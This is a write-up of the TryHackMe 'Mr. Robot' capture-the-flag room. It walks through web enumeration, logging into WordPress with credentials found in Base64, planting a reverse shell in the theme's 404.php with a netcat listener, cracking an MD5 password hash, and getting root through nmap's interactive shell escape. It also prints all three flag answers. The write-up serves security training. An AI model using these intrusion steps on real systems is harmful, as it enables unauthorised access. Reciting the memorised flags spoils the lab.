Mr. Robot CTF — TryHackMe Writeup

Author: Obada

Difficulty: Medium

Category: Enumeration, Web Exploitation, WordPress Abuse, Privilege Escalation


A tribute to the iconic Mr. Robot series, this CTF challenges you to think like Elliot Alderson: enumerate, exploit, escalate, and uncover the three hidden keys.

1. Network Setup
The initial tasks involve connecting to TryHackMe’s VPN using OpenVPN. Once connected, the machine becomes accessible via its internal IP.
(No answers required for Task 1.)

2. Enumeration
🔍 Nmap Scan
```Code
nmap -sV -sC -oA nmap_output [Target_IP]
```
Results:

22/tcp – closed (SSH)

80/tcp – open (Apache HTTP)

443/tcp – open (Apache HTTPS)

Since the machine uses a hostname internally, I added it to /etc/hosts:

```Code
[Target_IP]   mrrobot.thm
```
3. Directory Enumeration
🧭 Gobuster
```Code
gobuster dir -u http://mrrobot.thm \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-t 100 -q -o gobuster_output.txt
```
Key findings:

/robots

/readme

/wp-login

/wp-admin

/intro

/license

/fsocity.dic (important wordlist)

/key-1-of-3.txt

4. Key 1
Visiting:

```Code
http://mrrobot.thm/key-1-of-3.txt
```
Key 1:  
073403c8a58a1f80d943455fb30724b9

5. Credential Discovery
📁 fsocity.dic
Downloaded using:

```Code
curl http://mrrobot.thm/fsocity.dic > dictionary.txt
```
This is a custom wordlist used later for brute‑forcing.

📄 license
The /license page contained a Base64 string:

```Code
ZWxsaW90OkVSMjgtMDY1Mgo=
```
Decoded via CyberChef →
elliot : ER28-0652

These are valid WordPress credentials.

6. WordPress Access
Login page:

```Code
http://mrrobot.thm/wp-login.php
```
Using the credentials:

Username: elliot

Password: ER28-0652

We gain access to the WordPress admin panel.

7. Reverse Shell via Theme Editor
WordPress allows file editing.
I modified:

```Code
Appearance → Editor → 404.php
```
Replaced its content with a PentestMonkey PHP reverse shell, updating:

LHOST = my machine IP

LPORT = chosen port

Saved the file → “File edited successfully”.

Listener
```Code
nc -lvnp [PORT]
Trigger the shell
Code
http://mrrobot.thm/wp-includes/themes/twentyfifteen/404.php
```
A reverse shell is obtained.

Upgraded shell:

```Code
SHELL=/bin/bash script -q /dev/null
```
8. Key 2
The file /home/robot/key-2-of-3.txt is unreadable without proper permissions.

But /home/robot/password.raw-md5 is readable:

```Code
robot:c3fcd3d76192e4007dfb496cca67e13b
```
Cracked using John:

```Code
echo "c3fcd3d76192e4007dfb496cca67e13b" > secret
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt secret
```
Password found:
abcdefghijklmnopqrstuvwxyz

Switch user:

```Code
su robot
```
Now read key 2:

```Code
cat /home/robot/key-2-of-3.txt
```
Key 2:  
822c73956184f694993bede3eb39f959

9. Privilege Escalation
Searching for SUID binaries:

```Code
find / -perm -4000 2>/dev/null
```
A vulnerable version of nmap is present.

Exploit: Interactive Mode
```Code
nmap --interactive
!sh
```
This spawns a root shell.

10. Key 3
```Code
cat /root/key-3-of-3.txt
```
Key 3:  
04787ddef27c3dee1ee161b21670b4e4

11. Summary of Keys
Key	Value
Key 1	073403c8a58a1f80d943455fb30724b9
Key 2	822c73956184f694993bede3eb39f959
Key 3	04787ddef27c3dee1ee161b21670b4e4
12. Final Thoughts
This machine beautifully blends:

Web enumeration

WordPress exploitation

Credential cracking

Reverse shell techniques

Privilege escalation via SUID binaries

A perfect medium‑level challenge for sharpening real‑world pentesting skills.
